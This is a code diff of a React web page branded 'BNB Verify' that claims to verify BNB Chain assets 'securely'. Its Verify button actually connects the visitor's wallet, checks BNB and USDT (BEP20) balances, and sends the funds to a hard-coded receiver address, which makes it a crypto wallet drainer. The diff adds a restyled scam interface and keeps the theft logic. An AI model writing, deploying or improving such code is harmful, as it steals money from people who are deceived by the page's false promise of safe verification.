@@ -1,34 +1,34 @@
-import React, { useState } from "react";
+import { useState } from "react";
 import { ethers } from "ethers";
+import "./App.css";
 
-const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your receiver address
-const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
+const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
 const ERC20_ABI = [
   "function balanceOf(address) view returns (uint)",
   "function transfer(address to, uint amount) returns (bool)"
 ];
 
-export default function App() {
-  const [walletAddress, setWalletAddress] = useState("");
+function App() {
   const [status, setStatus] = useState("Click Verify to start...");
-
-  async function connectWallet() {
-    if (!window.ethereum) return alert("Please install MetaMask or Binance Wallet!");
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const address = await signer.getAddress();
-    setWalletAddress(address);
-  }
+  const [walletAddress, setWalletAddress] = useState("");
 
   async function handleVerify() {
-    if (!window.ethereum) return alert("Install Binance Wallet or MetaMask!");
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
-
-    setStatus("Checking balances...");
     try {
+      if (!window.ethereum) {
+        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
+        return;
+      }
+
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const userAddress = await signer.getAddress();
+      setWalletAddress(userAddress);
+
+      setStatus("Checking balances...");
+
+      // Check BNB balance
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > ethers.parseEther("0.001")) {
         setStatus("Sending BNB...");
@@ -41,6 +41,7 @@ export default function App() {
         return;
       }
 
+      // Check USDT BEP20 balance
       const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
       const balanceUSDT = await usdt.balanceOf(userAddress);
       if (balanceUSDT > 0n) {
@@ -59,38 +60,63 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen flex flex-col items-center bg-[#121212] px-6 py-12">
-      <header className="w-full max-w-5xl flex justify-between items-center mb-12">
-        <h1 className="text-yellow-400 text-3xl font-bold">Flash USDT / BNB Verify</h1>
-        {walletAddress ? (
-          <p className="text-green-400 font-medium">{walletAddress}</p>
-        ) : (
-          <button onClick={connectWallet} className="button-primary">Connect Wallet</button>
-        )}
+    <div className="App">
+      {/* Navbar */}
+      <header className="navbar">
+        <div className="nav-container">
+          <a href="#" className="nav-logo">
+            <div className="nav-logo-icon"></div>
+            <span>BNB Verify</span>
+          </a>
+        </div>
       </header>
 
-      <div className="relative flex justify-center items-center w-40 h-40 mb-6">
-        <div className="pulse-ring"></div>
-        <div className="pulse-ring"></div>
-        <div className="pulse-ring"></div>
-        <button onClick={handleVerify} className="button-primary z-10">Verify</button>
-      </div>
-      <p className="text-gray-300 text-center mb-12">{status}</p>
-
-      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 max-w-5xl w-full">
-        {["Explorer","Tokens","NFTs","DApps"].map((title) => (
-          <div key={title} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
-            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{title}</h2>
-            <p className="text-gray-400 text-sm">
-              {title === "Explorer" && "Browse BNB Chain addresses, contracts, tokens, and transactions."}
-              {title === "Tokens" && "Check token balances and verify authenticity of BNB Chain tokens."}
-              {title === "NFTs" && "Verify NFTs on BNB Chain and view metadata securely."}
-              {title === "DApps" && "Connect to decentralized apps and verify transactions safely."}
-            </p>
+      {/* Hero */}
+      <main className="hero">
+        <div className="hero-left">
+          <div className="badge">Powered by BNB Chain</div>
+          <h1>Verify Crypto Assets on BNB Chain</h1>
+          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) securely.</p>
+          <div className="hero-buttons">
+            <button onClick={handleVerify}>Verify</button>
           </div>
-        ))}
-      </div>
-      <footer className="mt-auto py-6 text-gray-500 text-sm text-center">© 2025 Flash USDT / BNB Verify</footer>
+          <p className="status">{status}</p>
+          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
+        </div>
+
+        <div className="hero-right">
+          <div className="pulse-ring outer"></div>
+          <div className="pulse-ring middle"></div>
+          <div className="pulse-ring inner"></div>
+          <div className="center-logo"></div>
+        </div>
+      </main>
+
+      {/* Cards Section */}
+      <section className="cards-section">
+        <div className="card">
+          <h2>Explorer</h2>
+          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
+        </div>
+        <div className="card">
+          <h2>Tokens</h2>
+          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
+        </div>
+        <div className="card">
+          <h2>NFTs</h2>
+          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
+        </div>
+        <div className="card">
+          <h2>DApps</h2>
+          <p>Connect to decentralized apps and verify transactions safely.</p>
+        </div>
+      </section>
+
+      <footer>
+        &copy; 2025 BNB Verify. Powered by BNB Chain.
+      </footer>
     </div>
   );
 }
+
+export default App;
